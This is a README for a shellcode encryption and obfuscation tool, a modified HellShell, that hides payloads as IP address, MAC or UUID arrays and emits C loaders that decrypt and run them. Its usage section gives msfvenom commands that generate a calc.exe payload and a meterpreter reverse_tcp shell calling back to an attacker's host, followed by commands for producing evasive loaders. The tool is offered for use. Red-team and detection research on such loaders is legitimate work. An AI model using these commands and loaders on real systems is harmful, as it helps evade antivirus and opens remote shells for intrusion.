# BetterHellShell

## Description

**BetterHellShell** is a payload encryption and obfuscation tool designed for obfuscating and encrypting shellcode or payloads.

This tool reads a payload from a file specified by the user, applies the selected encryption method (e.g., XOR, AES, RC4), and then obfuscates the payload using a chosen obfuscation method (MAC address, IPv4 address, UUID). If the payload is not already aligned with the required size, it will be padded to the nearest multiple required for obfuscation.

The program supports:
- Multiple encryption methods (XOR, AES, RC4).
- Several obfuscation techniques (IPv4, IPv6, MAC, UUID).
- Payload padding to ensure the correct size for obfuscation.

The encrypted and obfuscated payload, along with necessary decryption and deobfuscation functions, can then be written to a C file, which can then be compiled and executed or used as a base for more complex programs.

---

## Usage
First you will need to generate your payload:
  - Generate payload to open calc.exe (64-bit):
     ```c
     msfvenom -p windows/x64/exec cmd=calc.exe -f raw -o payload.bin
     ```
  - Generate payload to get a meterpreter reverse_tcp (64-bit):
     ```c
     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<hostIP> LPORT=<hostPORT> -f raw -o payload.bin
     ```

Then you can run BetterHellShell as follow:
  ```
  BetterHellShell.exe payload.bin aes none > aes_only.c
  ```
  > This will encrypt the payload using AES. Then, the encrypted payload, key, IV, and the decryption function will be written in the `aes_only.c` file.
  
  ```
  BetterHellShell.exe payload.bin rc4 uuid > rc4_uuid.c
  ```
  > This will encrypt the payload using rc4 and then obfuscate in an array of UUIDs. It will then be written with, its key, and the decryption/deobfuscation functions  in the `rc4_uuid.c` file.
  
  ```
  BetterHellShell.exe payload.bin none ipv4 > ipv4_only.c
  ```
  > The payload won't be encrypted, just obfuscated into an array of IPv4 addresses. It will then be written into the `ipv4_only.c` with deobfuscation function.

[!] When compiling your resulted c code, if using AES encryption, make sure that it contains `aes.h` and `aes.c` in your project. You can use the Execute folder-project for ease of compiling.

## Credits
 - This project is a modified version of HellShell by @NUL0x4C and @mrd0x
 - It also uses AES implementation from [tiny-aes-c](https://github.com/kokke/tiny-AES-c)
